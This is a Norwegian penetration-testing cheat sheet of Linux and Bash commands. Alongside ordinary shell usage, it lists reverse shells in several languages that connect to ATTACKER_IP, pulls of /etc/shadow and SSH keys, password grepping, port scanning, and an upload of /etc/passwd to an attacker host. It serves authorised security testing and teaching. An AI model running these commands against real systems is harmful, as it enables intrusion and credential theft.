# 🐧 Linux-kommandoer og Bash – komplett hurtigreferanse for penetrasjonstesting

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
> **Presisering:** Eksemplene forutsetter bestemte shell, verktøyvarianter og rettigheter. Et shell er kommandotolkeren, TTY gir terminalfunksjoner, og SUID/SGID lar kjørbare filer bruke bestemte eier-/grupperettigheter under gitte forutsetninger. Sammenligningene med `if ...; then` er løsrevne syntakseksempler uten egne kropper og `fi`, ikke ett kjørbart skript. `uniq` behandler tilstøtende like linjer; vilkårlig plasserte duplikater krever annen tilrettelegging. `nc -e` støttes ikke av alle Netcat-varianter, og Python 2-serveren er et historisk eksempel. `curl -k` slår av sertifikatkontroll, ikke TLS-kryptering. Kommandoene er bevart fra originalen.


```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ ███████╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║███████╗
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║╚════██║
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝███████║
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-black?style=for-the-badge&logo=linux" alt="Linux">
  <img src="https://img.shields.io/badge/Bash-green?style=for-the-badge&logo=gnubash" alt="Bash">
  <img src="https://img.shields.io/badge/Pentesting-red?style=for-the-badge" alt="Penetrasjonstesting">
</p>

---

## 📋 Innholdsfortegnelse

- [Navigasjon og filer](#-navigasjon-og-filer)
- [Systemkartlegging](#-systemkartlegging)
- [Brukerkartlegging](#-brukerkartlegging)
- [Nettverkskommandoer](#-nettverkskommandoer)
- [Filsøk og analyse](#-filsøk-og-analyse)
- [Tekstbehandling](#-tekstbehandling)
- [Tillatelser og eierskap](#-tillatelser-og-eierskap)
- [Prosessadministrasjon](#-prosessadministrasjon)
- [Pakkeadministrasjon](#-pakkeadministrasjon)
- [Bash-skripting](#-bash-skripting)
- [Omvendte shell](#-omvendte-shell)
- [Filoverføring](#-filoverføring)
- [Kommandoer på én linje](#-kommandoer-på-én-linje)

---

## 📁 Navigasjon og filer

### Katalognavigasjon

```bash
# Gjeldende katalog
pwd

# Bytt katalog
cd /path/to/dir
cd ..          # Overordnet katalog
cd ~           # Hjemmekatalog
cd -           # Forrige katalog

# List filer
ls
ls -la         # Langt format, alle filer
ls -lah        # Lesbare størrelser
ls -latr       # Sorter etter tid i omvendt rekkefølge
ll             # Alias for ls -la (i mange distribusjoner)
```

### Filoperasjoner

```bash
# Opprett filer og kataloger
touch file.txt
mkdir directory
mkdir -p dir1/dir2/dir3    # Opprett overordnede kataloger

# Kopier
cp source dest
cp -r source_dir dest_dir  # Rekursivt

# Flytt eller gi nytt navn
mv source dest
mv oldname newname

# Slett
rm file
rm -r directory            # Rekursivt
rm -rf directory           # Tving handlingen uten spørsmål

# Vis filer
cat file.txt
less file.txt              # Sidevisning
more file.txt
head -n 20 file.txt        # De første 20 linjene
tail -n 20 file.txt        # De siste 20 linjene
tail -f file.txt           # Følg endringer fortløpende
```

### Arkiver og komprimering

```bash
# tar
tar -cvf archive.tar files/      # Opprett
tar -xvf archive.tar             # Pakk ut
tar -czvf archive.tar.gz files/  # Opprett gzip-komprimert arkiv
tar -xzvf archive.tar.gz         # Pakk ut gzip-komprimert arkiv

# zip/unzip
zip archive.zip file1 file2
zip -r archive.zip directory/
unzip archive.zip

# gzip/gunzip
gzip file
gunzip file.gz

# 7zip
7z x archive.7z
```

---

## 🔍 Systemkartlegging

### Systeminformasjon

```bash
# Vertsnavn
hostname
hostname -I               # IP-adresser

# Operativsystem og kjerne
uname -a                  # All informasjon
uname -r                  # Kjerneversjon
cat /etc/os-release       # OS-informasjon
cat /etc/issue            # OS-banner
cat /proc/version         # Informasjon om kjerne og kompilator

# Arkitektur
arch
uname -m

# Maskinvare
lscpu                     # CPU-informasjon
cat /proc/cpuinfo
free -h                   # Minne
df -h                     # Diskplass
lsblk                     # Blokkenheter
```

### Miljø

```bash
# Miljøvariabler
env
printenv
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# Angi variabel
export VAR="value"
VAR="value"
```

### Tjenester som kjører

```bash
# Systemd
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl status service_name

# Init.d
service --status-all
service service_name status

# Kontroller lyttende porter
ss -tulpn
netstat -tulpn
```

### Cron-jobber

```bash
# Brukerens crontab
crontab -l

# Systemets crontab-filer
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# Følg med på cron (bruk pspy)
./pspy64
```

### Installerte pakker

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RHEL/CentOS
rpm -qa
yum list installed

# Finn pakke
dpkg -l | grep package
which binary
whereis binary
```

---

## 👤 Brukerkartlegging

### Gjeldende bruker

```bash
# Hvem er jeg
whoami
id
id username

# Grupper
groups
groups username

# Rettigheter
sudo -l                   # Sudo-rettigheter
cat /etc/sudoers          # Sudoers-fil (krever root)
```

### Alle brukere

```bash
# Brukerliste
cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd

# Brukere med shell
cat /etc/passwd | grep -v "nologin\|false"
grep -v "nologin\|false" /etc/passwd

# Passordhasher (krever root)
cat /etc/shadow

# Nylig påloggede brukere
last
lastlog
w
who
users
```

### Interessante filer

```bash
# SSH-nøkler
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Historikk
cat ~/.bash_history
cat ~/.zsh_history
history

# Konfigurasjonsfiler
cat ~/.bashrc
cat ~/.profile
cat /etc/profile
```

---

## 🌐 Nettverkskommandoer

### Nettverkskonfigurasjon

```bash
# IP-adresse
ip a
ip addr show
ifconfig

# Ruter
ip route
route -n
netstat -rn

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# ARP-tabell
arp -a
ip neigh
```

### Åpne porter og tilkoblinger

```bash
# Lyttende porter
ss -tulpn
ss -tlnp                  # Bare TCP
netstat -tulpn
netstat -ano

# Aktive tilkoblinger
ss -tup
netstat -an | grep ESTABLISHED

# Finn prosess ved hjelp av port
lsof -i :80
fuser 80/tcp
```

### Nettverkstesting

```bash
# Ping
ping -c 4 host

# Rutesporing
traceroute host
tracepath host

# DNS-oppslag
host domain.com
dig domain.com
nslookup domain.com

# Portkontroll
nc -zv host port
timeout 1 bash -c "</dev/tcp/host/port" && echo open

# Curl
curl -I http://host       # Bare headere
curl -s http://host       # Stille modus
curl -k https://host      # Ignorer SSL-kontroll
wget http://host/file
```

### Brannmur

```bash
# iptables
iptables -L -n -v
iptables -L INPUT -n --line-numbers

# UFW (Ubuntu)
ufw status
ufw status verbose

# firewalld (CentOS)
firewall-cmd --list-all
```

---

## 🔎 Filsøk og analyse

### Find-kommandoen

```bash
# Finn etter navn
find / -name "filename" 2>/dev/null
find / -iname "*.txt" 2>/dev/null      # Skill ikke mellom store og små bokstaver

# Finn etter type
find / -type f -name "*.conf"          # Filer
find / -type d -name "backup"          # Kataloger

# Finn etter tillatelser
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
find / -perm -o+w 2>/dev/null          # Skrivbar for alle

# Finn etter eier
find / -user root 2>/dev/null
find / -group admin 2>/dev/null

# Finn etter størrelse
find / -size +100M 2>/dev/null         # Større enn 100MB
find / -size -1k 2>/dev/null           # Mindre enn 1KB

# Finn etter tid
find / -mtime -7 2>/dev/null           # Endret de siste 7 dagene
find / -atime +30 2>/dev/null          # Åpnet for mer enn 30 dager siden

# Finn og kjør
find / -name "*.sh" -exec chmod +x {} \;
find / -name "*.log" -exec rm {} \;
```

### Grep (søk i filer)

```bash
# Grunnleggende søk
grep "pattern" file
grep -i "pattern" file                 # Skill ikke mellom store og små bokstaver
grep -r "pattern" /path/               # Rekursivt
grep -rn "pattern" /path/              # Med linjenumre

# Omvendt treff
grep -v "pattern" file                 # Linjer som IKKE samsvarer

# Tell treff
grep -c "pattern" file

# Vis omkringliggende linjer
grep -A 3 "pattern" file               # 3 linjer etter
grep -B 3 "pattern" file               # 3 linjer før
grep -C 3 "pattern" file               # 3 linjer på hver side

# Regulært uttrykk
grep -E "regex" file                   # Utvidet regulært uttrykk
egrep "regex" file

# Flere mønstre
grep -E "pattern1|pattern2" file
```

### Locate og Which

```bash
# Locate (krever updatedb)
locate filename
updatedb                               # Oppdater databasen

# Which (finn programfil)
which binary
whereis binary
type command
```

### Filanalyse

```bash
# Filtype
file filename

# Strenger i binærfil
strings binary
strings binary | grep password

# Heksadesimal visning
xxd file
hexdump -C file

# Hash
md5sum file
sha256sum file
sha1sum file
```

---

<a id="-tekstbehandling"></a>
## ✂️ Tekstbehandling

### Cut

```bash
# Del etter skilletegn
cut -d: -f1 /etc/passwd                # Første felt med : som skilletegn
cut -d: -f1,3 /etc/passwd              # Felt 1 og 3

# Del etter tegnposisjon
cut -c1-10 file                        # Tegn 1-10
```

### Awk

```bash
# Skriv ut kolonner
awk '{print $1}' file                  # Første kolonne
awk '{print $1, $3}' file              # Kolonne 1 og 3
awk -F: '{print $1}' /etc/passwd       # Egendefinert skilletegn

# Betingelser
awk '$3 > 1000' /etc/passwd            # Der felt 3 > 1000
awk '/pattern/ {print $1}' file        # Linjer som samsvarer

# Innebygde variabler
awk '{print NR, $0}' file              # Linjenumre
awk 'END {print NR}' file              # Totalt antall linjer
```

### Sed

```bash
# Erstatt
sed 's/old/new/' file                  # Første forekomst
sed 's/old/new/g' file                 # Alle forekomster
sed -i 's/old/new/g' file              # Rediger direkte i filen

# Slett linjer
sed '/pattern/d' file                  # Slett linjer som samsvarer
sed '5d' file                          # Slett linje 5
sed '1,5d' file                        # Slett linje 1-5

# Skriv ut bestemte linjer
sed -n '5p' file                       # Skriv ut linje 5
sed -n '1,10p' file                    # Skriv ut linje 1-10
```

### Sort og Uniq

```bash
# Sorter
sort file
sort -r file                           # Omvendt rekkefølge
sort -n file                           # Numerisk
sort -u file                           # Bare unike
sort -t: -k3 -n /etc/passwd            # Etter felt 3

# Unik
uniq file                              # Fjern tilstøtende duplikater
sort file | uniq                       # Fjern alle duplikater
uniq -c file                           # Tell forekomster
sort file | uniq -c | sort -rn         # Tell og sorter
```

### Andre nyttige verktøy

```bash
# Tell ord
wc -l file                             # Linjer
wc -w file                             # Ord
wc -c file                             # Byte

# Kolonneformatering
column -t file                         # Vis som tabell
column -s: -t /etc/passwd              # Egendefinert separator

# tr (tegnoversettelse)
echo "HELLO" | tr 'A-Z' 'a-z'          # Små bokstaver
cat file | tr -d '\n'                  # Fjern linjeskift

# xargs
find . -name "*.txt" | xargs rm
cat urls.txt | xargs -I {} curl {}
```

---

## 🔐 Tillatelser og eierskap

### Forstå tillatelser

```
-rwxr-xr-x
│└┬┘└┬┘└┬┘
│ │  │  └── Andre (r-x = 5)
│ │  └───── Gruppe (r-x = 5)
│ └──────── Eier   (rwx = 7)
└────────── Filtype (- = fil, d = katalog)
```

### Chmod

```bash
# Numerisk
chmod 755 file                         # rwxr-xr-x
chmod 644 file                         # rw-r--r--
chmod 777 file                         # rwxrwxrwx

# Symbolsk
chmod +x file                          # Legg til kjørerettighet
chmod -w file                          # Fjern skriverettighet
chmod u+x file                         # Kjørerettighet for eieren
chmod g+w file                         # Skriverettighet for gruppen
chmod o-r file                         # Ingen leserettighet for andre

# Rekursivt
chmod -R 755 directory/
```

### Chown

```bash
# Endre eier
chown user file
chown user:group file
chown -R user:group directory/

# Endre bare gruppe
chgrp group file
```

### Spesielle tillatelser

```bash
# SUID (Set User ID) – 4
chmod u+s file
chmod 4755 file

# SGID (Set Group ID) – 2
chmod g+s directory
chmod 2755 directory

# Sticky bit – 1
chmod +t directory
chmod 1755 directory

# Finn SUID/SGID
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
```

---

<a id="-prosessadministrasjon"></a>
## ⚙️ Prosessadministrasjon

### Vise prosesser

```bash
# List prosesser
ps aux
ps -ef
ps aux | grep process_name

# Top (sanntid)
top
htop                                   # Utvidet variant

# Prosesstre
pstree
ps auxf
```

### Prosesskontroll

```bash
# Bakgrunn og forgrunn
command &                              # Kjør i bakgrunnen
Ctrl+Z                                 # Sett på pause
bg                                     # Fortsett i bakgrunnen
fg                                     # Flytt til forgrunnen
jobs                                   # List jobber

# Avslutt prosess
kill PID
kill -9 PID                            # Tving avslutning
killall process_name
pkill process_name

# Nice (prioritet)
nice -n 10 command                     # Lavere prioritet
renice 10 -p PID
```

---

## 📦 Pakkeadministrasjon

### Debian/Ubuntu (apt/dpkg)

```bash
# Oppdater
apt update
apt upgrade

# Installer
apt install package
dpkg -i package.deb

# Fjern
apt remove package
apt purge package                      # Fjern inkludert konfigurasjon

# Søk
apt search package
apt-cache search package

# Informasjon
apt show package
dpkg -l | grep package
```

### RHEL/CentOS (yum/dnf)

```bash
# Oppdater
yum update
dnf update

# Installer
yum install package
dnf install package

# Fjern
yum remove package

# Søk
yum search package

# Informasjon
yum info package
rpm -qa | grep package
```

---

## 💻 Bash-skripting

### Grunnleggende bruk

```bash
#!/bin/bash

# Variabler
NAME="value"
echo $NAME
echo "${NAME}_suffix"

# Kommandosubstitusjon
DATE=$(date)
FILES=`ls -la`

# Les inndata
read -p "Enter name: " NAME
echo "Hello $NAME"
```

### Betingelser

```bash
# if/else
if [ condition ]; then
    echo "true"
elif [ condition2 ]; then
    echo "condition2"
else
    echo "false"
fi

# Sammenligninger (strenger)
if [ "$str1" = "$str2" ]; then
if [ "$str1" != "$str2" ]; then
if [ -z "$str" ]; then                 # Tom
if [ -n "$str" ]; then                 # Ikke tom

# Sammenligninger (tall)
if [ $num1 -eq $num2 ]; then           # Lik
if [ $num1 -ne $num2 ]; then           # Ikke lik
if [ $num1 -gt $num2 ]; then           # Større enn
if [ $num1 -lt $num2 ]; then           # Mindre enn

# Filtester
if [ -e file ]; then                   # Finnes
if [ -f file ]; then                   # Er fil
if [ -d dir ]; then                    # Er katalog
if [ -r file ]; then                   # Lesbar
if [ -w file ]; then                   # Skrivbar
if [ -x file ]; then                   # Kjørbar
```

### Løkker

```bash
# for-løkke
for i in 1 2 3 4 5; do
    echo $i
done

for i in {1..10}; do
    echo $i
done

for file in *.txt; do
    echo $file
done

for i in $(cat list.txt); do
    echo $i
done

# while-løkke
while [ condition ]; do
    echo "loop"
done

while read line; do
    echo $line
done < file.txt

# for-løkke i C-stil
for ((i=0; i<10; i++)); do
    echo $i
done
```

### Funksjoner

```bash
# Definer funksjon
function_name() {
    echo "Argument 1: $1"
    echo "Argument 2: $2"
    echo "All args: $@"
    echo "Num args: $#"
}

# Kall funksjon
function_name arg1 arg2
```

### Skripteksempel

```bash
#!/bin/bash
# Portskanner

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

TARGET=$1

for PORT in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && echo "Port $PORT open"
done
```

---

## 🔌 Omvendte shell

### Bash

```bash
# Bash TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Bash UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

### Netcat

```bash
# nc med -e
nc -e /bin/bash ATTACKER_IP PORT

# nc uten -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Oppgradere shell

```bash
# Start TTY
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash

# Full TTY
# I det omvendte shellet:
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
# På angriperens maskin:
stty raw -echo; fg
# I shellet:
export TERM=xterm
stty rows 40 cols 150
```

---

<a id="-filoverføring"></a>
## ⬇️ Filoverføring

### Fra angriper til mål

```bash
# wget
wget http://ATTACKER_IP/file -O /tmp/file

# curl
curl http://ATTACKER_IP/file -o /tmp/file

# nc
# Angriper: nc -lvnp 4444 < file
nc ATTACKER_IP 4444 > file

# scp
scp user@ATTACKER_IP:/path/file /tmp/

# base64 (for små filer)
# Angriper: base64 file
echo "BASE64_STRING" | base64 -d > file
```

### Fra mål til angriper

```bash
# nc
# Angriper: nc -lvnp 4444 > file
nc ATTACKER_IP 4444 < file

# curl (POST)
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP/upload

# base64
base64 file
# Kopier utdata til angriperens maskin og dekod
```

### Starte HTTP-server

```bash
# Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -e httpd . -p 8000
```

---

## ⚡ Kommandoer på én linje

### Nyttige kommandoer på én linje for penetrasjonstest

```bash
# Finn SUID-binærfiler
find / -perm -4000 -type f 2>/dev/null

# Finn skrivbare kataloger
find / -writable -type d 2>/dev/null

# Finn filer som er skrivbare for alle
find / -perm -o+w -type f 2>/dev/null

# Finn konfigurasjonsfiler med passord
grep -r "password" /etc/ 2>/dev/null
grep -ri "pass\|pwd\|secret" /var/www/ 2>/dev/null

# Finn SSH-nøkler
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Rask portskanning
for p in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/TARGET/$p" 2>/dev/null && echo "$p open"; done

# Søk etter aktive verter (ping sweep)
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "from" & done

# Hent ut IP-adresser fra fil
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file

# Base64-koding og -dekoding
echo "string" | base64
echo "c3RyaW5n" | base64 -d

# URL-koding og -dekoding
echo "string" | xxd -plain | sed 's/\(..\)/%\1/g'
echo "%73%74%72%69%6e%67" | xxd -r -p
```

### Hurtigreferansetabell

| Formål | Kommando |
|---------|---------|
| Gjeldende bruker | `whoami` / `id` |
| Systeminformasjon | `uname -a` |
| IP-adresse | `ip a` / `hostname -I` |
| Åpne porter | `ss -tulpn` |
| Prosesser som kjører | `ps aux` |
| Finn SUID | `find / -perm -4000 2>/dev/null` |
| Skrivbare kataloger | `find / -writable -type d 2>/dev/null` |
| Last ned fil | `wget http://url/file` |
| Omvendt shell | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Oppgrader TTY | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |

---

## 📚 Ressurser

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks om Linux](https://book.hacktricks.xyz/linux-hardening)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Hurtigreferanse for omvendte shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Relaterte hurtigreferanser
- [Rettighetseskalering i Linux](../../Linux-PrivEsc/README.md)
- [Nmap](../../Nmap/README.md)
- [Metasploit](../../Metasploit/translations/README.nb.md)

---

<p align="center">
  <b>🐧 Lær Linux for penetrasjonstesting!</b><br>
  <i>Kommandolinjen er en nyttig medspiller</i>
</p>
